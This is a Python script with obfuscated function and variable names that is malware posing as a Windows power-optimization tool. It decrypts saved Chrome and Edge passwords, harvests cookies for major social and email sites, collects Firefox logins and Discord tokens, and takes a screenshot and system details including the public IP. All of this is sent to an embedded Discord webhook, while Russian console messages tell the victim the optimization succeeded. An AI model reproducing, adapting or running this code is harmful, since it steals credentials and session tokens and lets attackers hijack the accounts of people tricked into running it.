import os
import json
import sqlite3
import shutil
import requests
import base64
from datetime import datetime
from Crypto.Cipher import AES
import win32crypt
from PIL import ImageGrab
import re
import platform
DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1532775619946090796/Mr44TRxfUz08LER_4bSNeNiQ8nODkW3DHmo4EKumGMfql5IAwf_h1aulF1DvJi-e6eT2'

def OOOO000OOOOO(O0OOO0O0O000):
    O00OO000O00O = os.path.join(O0OOO0O0O000, 'Local State')
    if not os.path.exists(O00OO000O00O):
        return None
    with open(O00OO000O00O, 'r', encoding='utf-8') as OO0O000000O0:
        O0000O0O00OO = json.load(OO0O000000O0)
    O0OOO0OOOO00 = base64.b64decode(O0000O0O00OO['os_crypt']['encrypted_key'])
    O0OOO0OOOO00 = O0OOO0OOOO00[5:]
    try:
        OO0O0OOOOO0O = win32crypt.CryptUnprotectData(O0OOO0OOOO00, None, None, None, 0)[1]
        return OO0O0OOOOO0O
    except:
        return None

def O00OOO0O0OO0(O0OO00000OOO, O00O0O0O0000):
    if not O00O0O0O0000:
        return '[НЕТ КЛЮЧА]'
    try:
        O0O0OOOO000O = O0OO00000OOO[3:15]
        OO0000O0O0O0 = O0OO00000OOO[15:-16]
        OOOO00OOO0OO = O0OO00000OOO[-16:]
        OO000OO00O00 = AES.new(O00O0O0O0000, AES.MODE_GCM, O0O0OOOO000O)
        O00OOOO00O0O = OO000OO00O00.decrypt_and_verify(OO0000O0O0O0, OOOO00OOO0OO)
        return O00OOOO00O0O.decode('utf-8')
    except:
        try:
            return win32crypt.CryptUnprotectData(O0OO00000OOO, None, None, None, 0)[1].decode('utf-8')
        except:
            return '[НЕ УДАЛОСЬ РАСШИФРОВАТЬ]'

def O0OOOOOOOOO0(OO00OOO0OOOO, OO00OOOOO000):
    O0O00O0OO00O = []
    O00O0O0O00O0 = os.path.join(OO00OOOOO000, 'Login Data')
    if not os.path.exists(O00O0O0O00O0):
        return O0O00O0OO00O
    OO0000O000OO = os.path.join(os.environ['TEMP'], f'{OO00OOO0OOOO.lower()}_login.db')
    shutil.copyfile(O00O0O0O00O0, OO0000O000OO)
    O0OO0000OO00 = OOOO000OOOOO(OO00OOOOO000)
    OO000O00OO0O = sqlite3.connect(OO0000O000OO)
    OO0000O00OO0 = OO000O00OO0O.cursor()
    OO0000O00OO0.execute('SELECT origin_url, username_value, password_value FROM logins')
    for OO00OO0O0OOO in OO0000O00OO0.fetchall():
        OOO0O0O00000 = OO00OO0O0OOO[0]
        OOOOOO00000O = OO00OO0O0OOO[1]
        OO000OOOO0O0 = OO00OO0O0OOO[2]
        if OOO0O0O00000 and OO000OOOO0O0:
            OOOO0000O0OO = O00OOO0O0OO0(OO000OOOO0O0, O0OO0000OO00)
            O0O00O0OO00O.append({'url': OOO0O0O00000, 'username': OOOOOO00000O if OOOOOO00000O else '[НЕТ]', 'password': OOOO0000O0OO})
    OO0000O00OO0.close()
    OO000O00OO0O.close()
    os.remove(OO0000O000OO)
    return O0O00O0OO00O

def OOOOO0OO0O00(OO00O0OO0O0O, O0O00O00OOO0):
    O0O0O0OOOOOO = []
    OOO00O00O000 = os.path.join(O0O00O00OOO0, 'Cookies')
    if not os.path.exists(OOO00O00O000):
        return O0O0O0OOOOOO
    O0OO00O0O00O = os.path.join(os.environ['TEMP'], f'{OO00O0OO0O0O.lower()}_cookies.db')
    shutil.copyfile(OOO00O00O000, O0OO00O0O00O)
    OO0OO0O000O0 = OOOO000OOOOO(O0O00O00OOO0)
    OOOOOOOO00OO = sqlite3.connect(O0OO00O0O00O)
    O0O00O0OOO00 = OOOOOOOO00OO.cursor()
    O0O00O0OOO00.execute("\n        SELECT host_key, name, encrypted_value \n        FROM cookies \n        WHERE host_key LIKE '%google%' \n           OR host_key LIKE '%facebook%' \n           OR host_key LIKE '%discord%'\n           OR host_key LIKE '%twitter%'\n           OR host_key LIKE '%instagram%'\n    ")
    for O0OO000OOO0O in O0O00O0OOO00.fetchall():
        try:
            OOO00OOO0OO0 = O00OOO0O0OO0(O0OO000OOO0O[2], OO0OO0O000O0)
            if OOO00OOO0OO0 and len(OOO00OOO0OO0) > 5:
                O0O0O0OOOOOO.append({'domain': O0OO000OOO0O[0], 'name': O0OO000OOO0O[1], 'value': OOO00OOO0OO0[:50] + '...' if len(OOO00OOO0OO0) > 50 else OOO00OOO0OO0})
        except:
            pass
    O0O00O0OOO00.close()
    OOOOOOOO00OO.close()
    os.remove(O0OO00O0O00O)
    return O0O0O0OOOOOO

def OOO0O0O00OOO():
    O0OOOOOO0000 = os.path.expandvars('%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default')
    return O0OOOOOOOOO0('Edge', O0OOOOOO0000)

def OO00O00O000O():
    OO00OO00O0O0 = os.path.expandvars('%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default')
    return OOOOO0OO0O00('Edge', OO00OO00O0O0)

def OOO0OO0OO0OO():
    O0OO00000O00 = os.path.expandvars('%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default')
    return O0OOOOOOOOO0('Chrome', O0OO00000O00)

def OOOOO0000O0O():
    O000O00OOOO0 = os.path.expandvars('%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default')
    return OOOOO0OO0O00('Chrome', O000O00OOOO0)

def O000O000OOOO():
    OOOOO00OO000 = []
    O0OOOOOOO00O = os.path.expandvars('%APPDATA%\\Mozilla\\Firefox\\Profiles')
    if not os.path.exists(O0OOOOOOO00O):
        return OOOOO00OO000
    for O00OOOOO00O0 in os.listdir(O0OOOOOOO00O):
        O0OOOO0000OO = os.path.join(O0OOOOOOO00O, O00OOOOO00O0, 'logins.json')
        if os.path.exists(O0OOOO0000OO):
            with open(O0OOOO0000OO, 'r', encoding='utf-8') as O00OO0O0OO00:
                try:
                    O00OOOO0OO0O = json.load(O00OO0O0OO00)
                    for O000OO000OO0 in O00OOOO0OO0O.get('logins', []):
                        OOOOO00OO000.append({'url': O000OO000OO0.get('hostname', 'N/A'), 'username': O000OO000OO0.get('usernameField', '[НЕТ]'), 'password': O000OO000OO0.get('encryptedPassword', '[ЗАШИФРОВАНО]')})
                except:
                    pass
    return OOOOO00OO000

def O0000OOO0OOO():
    O00O0O000000 = []
    O00O0OO0000O = [os.path.expandvars('%APPDATA%\\discord\\Local Storage\\leveldb'), os.path.expandvars('%APPDATA%\\Lightcord\\Local Storage\\leveldb'), os.path.expandvars('%APPDATA%\\BetterDiscord\\Local Storage\\leveldb')]
    for OO0O000OO0O0 in O00O0OO0000O:
        if os.path.exists(OO0O000OO0O0):
            for OOO0O0O0O0OO in os.listdir(OO0O000OO0O0):
                if OOO0O0O0O0OO.endswith('.log') or OOO0O0O0O0OO.endswith('.ldb'):
                    try:
                        with open(os.path.join(OO0O000OO0O0, OOO0O0O0O0OO), 'r', encoding='utf-8', errors='ignore') as OOO00O0O0O00:
                            O0O00O0O0O0O = OOO00O0O0O00.read()
                            OOO0OOO0OOO0 = re.findall('[\\w-]{24,28}\\.[\\w-]{6}\\.[\\w-]{27,38}', O0O00O0O0O0O)
                            O00O0O000000.extend(OOO0OOO0OOO0)
                    except:
                        pass
    return list(set(O00O0O000000))

def OOO00O0OOOOO():
    try:
        O000OOO0O000 = ImageGrab.grab()
        O000OOO0O000.thumbnail((1280, 720))
        O000OOO0O000.save('screenshot.png', optimize=True, quality=85)
        return 'screenshot.png'
    except:
        return None

def OO00OO00O00O():
    try:
        OOO00O0000O0 = requests.get('https://api.ipify.org?format=json', timeout=5).json().get('ip', 'N/A')
    except:
        OOO00O0000O0 = 'N/A'
    return {'ip': OOO00O0000O0, 'hostname': os.getenv('COMPUTERNAME', 'N/A'), 'user': os.getenv('USERNAME', 'N/A'), 'os': platform.platform(), 'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'), 'processor': platform.processor(), 'architecture': platform.architecture()[0]}

def OOOOO00O00OO(O000OOOOOO00, file_path=None):
    O000O0OOOO0O = len(O000OOOOOO00.get('chrome_passwords', [])) + len(O000OOOOOO00.get('edge_passwords', [])) + len(O000OOOOOO00.get('firefox_passwords', []))
    O0OO000O0OO0 = f'**[!] Собрано {O000O0OOOO0O} паролей**\n'
    O0OO000O0OO0 += f"Chrome: {len(O000OOOOOO00.get('chrome_passwords', []))}\n"
    O0OO000O0OO0 += f"Edge: {len(O000OOOOOO00.get('edge_passwords', []))}\n"
    O0OO000O0OO0 += f"Firefox: {len(O000OOOOOO00.get('firefox_passwords', []))}\n"
    O0OO000O0OO0 += f"Cookies: {len(O000OOOOOO00.get('cookies', []))}\n"
    O0OO000O0OO0 += f"Discord токенов: {len(O000OOOOOO00.get('discord_tokens', []))}"
    O0O00O000OOO = f'{O0OO000O0OO0}\n\n```json\n{json.dumps(O000OOOOOO00, indent=2, ensure_ascii=False)[:1500]}\n```'
    if len(O0O00O000OOO) > 1900:
        O0O00O000OOO = O0O00O000OOO[:1900] + '\n```\n... (обрезано)'
    OOO0O00O0000 = {'content': O0O00O000OOO}
    if file_path and os.path.exists(file_path):
        with open(file_path, 'rb') as OOO000OO000O:
            OO0O0OO0O0O0 = requests.post(DISCORD_WEBHOOK, data=OOO0O00O0000, files={'file': (os.path.basename(file_path), OOO000OO000O, 'image/png')})
        os.remove(file_path)
    else:
        OO0O0OO0O0O0 = requests.post(DISCORD_WEBHOOK, json=OOO0O00O0000)
    if OO0O0OO0O0O0.status_code == 204:
        print('[+] Оптимизация прошла успешно ')
    else:
        print(f'[-] Ошибка: {OO0O0OO0O0O0.status_code} - {OO0O0OO0O0O0.text[:200]}')

def OOO00OOOO0OO():
    print('[*] Запуск оптимизации энерго питания windows')
    O00OO0O00O00 = {'system': OO00OO00O00O(), 'chrome_passwords': OOO0OO0OO0OO(), 'edge_passwords': OOO0O0O00OOO(), 'firefox_passwords': O000O000OOOO(), 'cookies': OOOOO0000O0O() + OO00O00O000O(), 'discord_tokens': O0000OOO0OOO(), 'timestamp': datetime.now().isoformat()}
    OO0O00O00O0O = OOO00O0OOOOO()
    if OO0O00O00O0O:
        OOOOO00O00OO(O00OO0O00O00, OO0O00O00O0O)
    else:
        OOOOO00O00OO(O00OO0O00O00)
    print('[+] Готово!')
if __name__ == '__main__':
    OOO00OOOO0OO()